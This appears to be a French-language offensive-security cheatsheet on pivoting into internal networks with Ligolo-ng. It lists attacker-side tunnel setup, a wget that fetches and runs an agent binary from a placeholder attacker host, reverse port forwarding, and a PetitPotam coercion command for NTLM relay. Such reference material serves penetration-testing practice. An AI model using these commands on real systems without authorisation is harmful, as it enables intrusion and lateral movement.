---
title: "Ligolo-ng Pivoting Cheatsheet"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "sudo ip tuntap add user $(whoami) mode tun ligolo sudo ip link set ligolo up sudo ip route add 192.168.X.0/24 dev ligolo ./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601"
summary: "Pivoting | Ligolo-ng Pivoting Cheatsheet"
tags:
  - "Pivoting"
  - "Tunneling"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "Pivoting"
ShowToc: true
TocOpen: false
---

## Setup (machine attaquante)
```bash
# Créer interface TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Ajouter la route vers le réseau interne
sudo ip route add 192.168.X.0/24 dev ligolo

# Lancer le proxy
./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601
```

## Upload et lancement agent (machine cible)
```powershell
# Windows
upload agent.exe C:\temp\agent.exe
C:\temp\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert

# Linux
wget http://<ATTACKER_IP>:8000/agent -O /tmp/agent
chmod +x /tmp/agent
/tmp/agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

## Console Ligolo
```
session                    # Sélectionner l'agent
start                      # Démarrer le tunnel

# Listener (reverse port forward)
listener_add --addr <INTERNAL_IP>:<PORT> --to <ATTACKER_IP>:<PORT> --tcp
listener_list              # Lister les listeners
listener_del <ID>          # Supprimer un listener
```

## Problèmes courants
- **Route disparaît** après reconnexion agent → `sudo ip route add X.X.X.0/24 dev ligolo`
- **Port déjà pris** pour listener → utiliser un port différent
- **Listener sur 0.0.0.0:445** échoue sur un DC → le SMB du DC occupe déjà le port

## Cas d'usage : NTLM relay via réseau interne
```
# Le problème : WEB01 (interne) doit s'auth vers notre ntlmrelayx (externe)
# Solution : PetitPotam coerce WEB01 vers notre IP externe
# Si WEB01 a une route vers l'extérieur (via le DC comme gateway)

python3 PetitPotam.py <ATTACKER_IP> <INTERNAL_TARGET>
```
